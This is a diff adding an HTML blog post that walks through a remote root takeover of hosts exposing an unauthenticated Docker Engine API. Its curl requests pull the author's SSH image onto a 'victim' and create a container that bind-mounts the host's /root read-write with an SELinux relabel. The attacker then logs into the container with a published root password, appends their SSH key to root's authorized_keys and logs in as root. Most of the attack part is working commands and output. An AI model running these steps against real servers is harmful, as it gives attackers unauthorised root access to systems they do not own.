@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link href="https://fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet">
+
+        <title>Docker API Privilege Escalation [Remote][EN]</title>
+
+        <link rel="stylesheet" href="/css/stylesheet.css">
+    </head>
+    <body>
+        <section id="page-title">
+            <h1><a href="/">Persistence of Mindfuck - Pype blog</a></h1>
+        </section>
+
+
+
+<section class="blog-post">
+    <h1>Docker API Privilege Escalation [Remote][EN]</h1>
+    <div class="blog-post-subheader">
+        January 17, 2018
+    </div>
+    <div class="blog-post-content">
+        
+
+<hr />
+
+<p>This document has the objective to explain a simple way to remotely make a privilege escalation in a Docker, using it&rsquo;s own Engine API service.</p>
+
+<p>During my analisys routine I manage to successfully make an attack, so I decided to share freely.</p>
+
+<p>I`ve made an image available containing a SSH service enabled in the  <a href="https://hub.docker.com/r/pype/privsshd/">Docker Hub</a> to help in the attack (The image available it&rsquo;s huge, more than 200MB because of the Ubuntu base image. As soon as possible I will made available a smaller image).</p>
+
+<p>PS: This attack explore a option available in the docker, without the need to utilize memory exploitation or similar way (As usually used to escape the container).
+<strong>PS2: This is only ONE of many ways to explore an server utilizing the docker API service.</strong> If during my analysis I find others explore methods, I will post in this repository.</p>
+
+<p>Any suggestions to improve the attack or to protect yourself, I&rsquo;m available to listen to all of it and add to this document if appropriate.</p>
+
+<h2 id="engine-api">Engine API</h2>
+
+<p><em>&ldquo;The Engine API is an HTTP API served by Docker Engine. It is the API the Docker client uses to communicate with the Engine, so everything the Docker client can do can be done with the API.&rdquo;</em></p>
+
+<p><strong>By default this service don&rsquo;t use any authentication</strong>, but this resource it&rsquo;s made available by the platform.</p>
+
+<ul>
+<li><a href="https://docs.docker.com/engine/api/v1.32/">Docker Engine API</a></li>
+<li><a href="https://docs.docker.com/engine/api/v1.32/#section/Authentication">Authentication</a></li>
+</ul>
+
+<p>During the attack, we are going to utilize the parameters provided by the platform so this way we can explore the system and obtain privileged internal access.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>The main focus of the attack it&rsquo;s to be able to inject our public key inside the file <em>&ldquo;authorized_keys&rdquo;</em> from the root user in the server!</p>
+
+<p>The exploration consist in six parts:</p>
+
+<ol>
+<li><strong>Push the image in server</strong></li>
+<li><strong>Configure a container with our image</strong></li>
+<li><strong>Start the container</strong></li>
+<li><strong>Connect to container SSH</strong></li>
+<li><strong>Import public key in .ssh/authorized_keys in root directory</strong></li>
+<li><strong>Finaly connect to SSH server with root access</strong></li>
+</ol>
+
+<hr />
+
+<ul>
+<li><strong>Push image in server</strong></li>
+</ul>
+
+<p>The selected image for the attack need to have some kind the shell remote service available in the start, so this way we can connect to the container inside the server.</p>
+
+<pre><code class="language-bash">curl -XPOST &quot;http://victim/images/create?fromImage=pype/privsshd&quot;
+
+&lt; HTTP/1.1 200 OK
+&lt; Content-Type: application/json
+&lt; Server: Docker/1.12.6 (linux)
+&lt; Date: Sat, 06 Jan 2018 15:41:46 GMT
+&lt; Transfer-Encoding: chunked
+&lt; 
+...
+{&quot;status&quot;:&quot;Status: Image is up to date for docker.io/pype/privsshd:latest&quot;}
+</code></pre>
+
+<p>In the example above I used the option to create an image from the official repository. There is <a href="https://docs.docker.com/engine/api/v1.24/#32-images">other methods</a> to execute the same operation.</p>
+
+<p>pype/privsshd -  The Image that I&rsquo;ve made available to help in the documentation of the attack.</p>
+
+<ul>
+<li><strong>Configure a container with our image</strong></li>
+</ul>
+
+<p>For we to be able to inject our public key inside the file .ssh/authorized_key, we need access to the root directory in the Docker Server. For this we are going to utilize the option &ldquo;Binds&rdquo;, this way we can select the volume of what is going to be shared between the server and our container. (Remember to configure the read and write option)</p>
+
+<p><strong>SELINUX  *&ldquo;Bypass&rdquo;</strong>*</p>
+
+<p>The Docker provides a mounting option capable of modify the SELINUX file or directory label shared with the container. With this option, it’s possible to mount privileged directory inside of our container (E.g.: /root/;/etc;/bin …).</p>
+
+<p>We can send this option via API too, this way we can work around the SELINUX remotely .</p>
+
+<p><em>&ldquo;This affects the file or directory on the host machine itself and can have consequences outside of the scope of Docker.&rdquo;</em></p>
+
+<pre><code class="language-json">&quot;Binds&quot;:[  
+      &quot;/root/:/root/:rw,z&quot;
+      ]
+</code></pre>
+
+<p>Mais informações: <a href="https://docs.docker.com/engine/admin/volumes/bind-mounts/#configure-the-selinux-label">Configure-the-selinux-label</a></p>
+
+<p>Supposing that our target server already has the port number 22 busy by it&rsquo;s own SSH service, we have to point another outgoing port for our connection with the container, we are going to configure the option &ldquo;PortBindings&rdquo; with &ldquo;HostPort&rdquo; in another port.</p>
+
+<pre><code class="language-json">{  
+   &quot;Image&quot;:&quot;pype/privsshd&quot;,
+   &quot;Binds&quot;:[  
+      &quot;/root/:/root/:rw,z&quot;
+   ],
+   &quot;PortBindings&quot;:{  
+      &quot;22/tcp&quot;:[  
+         {  
+            &quot;HostIp&quot;:&quot;&quot;,
+            &quot;HostPort&quot;:&quot;2233&quot;
+         }
+      ]
+   }
+}
+</code></pre>
+
+<p>JSON it&rsquo;s the only format accepted by the platform, therefore configure the Content-Type of your requisition to this type of language.</p>
+
+<pre><code class="language-bash">curl -H &quot;Content-Type: application/json&quot; -d '{&quot;Image&quot;:&quot;pype/privsshd&quot;, &quot;Binds&quot;: [&quot;/root/:/root/:rw,z&quot;],&quot;PortBindings&quot;:{&quot;22/tcp&quot;:[{&quot;HostIp&quot;:&quot;&quot;,&quot;HostPort&quot;:&quot;2233&quot;}]}}' -XPOST &quot;http://victim/containers/create&quot;
+
+&lt; HTTP/1.1 201 Created
+&lt; Content-Type: application/json
+&lt; Server: Docker/1.12.6 (linux)
+&lt; Date: Sat, 06 Jan 2018 16:03:34 GMT
+&lt; Content-Length: 90
+&lt; 
+{&quot;Id&quot;:&quot;5a3c7f18d202f62...4789e781132495781f&quot;,&quot;Warnings&quot;:null}
+</code></pre>
+
+<p>If everything worked out, the requisition will return an ID and this will be the your container identifier</p>
+
+<ul>
+<li><strong>Start the container</strong></li>
+</ul>
+
+<p>Use the Identifier to start your container remotely.</p>
+
+<pre><code class="language-bash">curl -XPOST &quot;http://victim/containers/5a3c7f18d202f62...4789e781132495781f/start&quot; -v 
+
+&lt; HTTP/1.1 204 No Content
+&lt; Server: Docker/1.12.6 (linux)
+&lt; Date: Sat, 06 Jan 2018 22:29:46 GMT
+
+</code></pre>
+
+<p>Verify if the service was started with success in the target server.</p>
+
+<pre><code class="language-bash">~ » nc victim 2233
+SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
+</code></pre>
+
+<ul>
+<li><strong>Connect to container SSH</strong></li>
+</ul>
+
+<pre><code class="language-bash">~ » ssh root@victim -p2233
+root@victim password: 
+root@5a3c7f18d202:~#
+</code></pre>
+
+<p>If you utilized my image <strong>privsshd</strong>, the root password it&rsquo;s: <em>screencast</em>.</p>
+
+<ul>
+<li><strong>Import public key in .ssh/authorized_keys in root directory</strong></li>
+</ul>
+
+<p>Now you are free to inject your public key and&hellip;</p>
+
+<pre><code class="language-bash">root@5a3c7f18d202:~# ls .ssh/
+authorized_keys  id_rsa  id_rsa.pub  known_hosts
+root@5a3c7f18d202:~# echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAAD..&quot; &gt;&gt; .ssh/authorized_keys
+</code></pre>
+
+<ul>
+<li><strong>Finaly connect to SSH server with root access</strong></li>
+</ul>
+
+<pre><code class="language-bash">~ » ssh root@victim -i key.rsa
+[root@docker-server ~]# id
+uid=0(root) gid=0(root) groups=0(root) 
+[root@docker-server ~]# docker --version
+Docker version 1.12.6, build ae7d637/1.12.6
+</code></pre>
+
+<p>Now you have privileged access inside the remote server. :)</p>
+
+<hr />
+
+<p>References:</p>
+
+<p><a href="http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html">http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html</a></p>
+
+<p><a href="https://docs.docker.com/engine/api/v1.24">https://docs.docker.com/engine/api/v1.24</a></p>
+
+<p><a href="https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/">https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/</a></p>
+
+    </div>
+</section>
+
+    </body>
+</html>
